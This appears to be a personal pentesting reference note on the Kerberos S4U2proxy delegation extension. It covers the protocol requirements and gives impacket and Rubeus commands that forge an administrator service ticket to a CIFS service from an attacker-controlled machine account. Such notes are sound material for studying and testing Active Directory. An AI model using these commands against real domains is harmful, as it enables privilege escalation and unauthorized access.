---
title: S4U2proxy
---

> The *Service for User to Proxy* extension provides a service that obtains a [[notes/ad/kerberos-st]] to another service on behalf of a user.
> The second service is typically a proxy performing some work on behalf of the first service, and the proxy is doing that work under the authorization context of the user.
> ([source](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a))

S4U2proxy uses a forwardable ST obtained trough [[notes/ad/kerberos-s4u2self]] to request a ST for the SPN.
The DC verifies that `msDS-AllowedToDelegateTo` attribute of the requesting account contains the requested SPN.

Requirements ([source](./roses-are-red-violets-are-blue-s4u-bamboozles-me-u2u-too-charlie-bromberg-northsec-2023.pdf)):

- request must include an additional-ticket as evidence
- additional ticket must either be forwardable or have the [[notes/ad/rbcd]] bit set in the PA-PAC-OPTIONS
- requester must be allowed to delegate to target via [[notes/ad/constrained-delegation]] or [[notes/ad/rbcd]]
- ST obtained with S4U2proxy is always forwardable

Get a ST to impersonate an admin against `srv01$`.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-getst -impersonate administrator -spn cifs/srv01.corp.local -k -no-pass 'corp.local/attackerpc$'
    export KRB5CCNAME=$PWD/administrator.ccache
    ~~~

=== "[[notes/tools/rubeus]]"
    ~~~ bat
    .\rubeus.exe s4u /nowrap /impersonateuser:administrator /msdsspn:cifs/srv01.corp.local /user:attackerpc$ /aes256:%key%
    ~~~

References:

- [GOAD - part 11 - ACL](http://web.archive.org/web/20221209174533/https://mayfly277.github.io/posts/GOADv2-pwning-part11/)
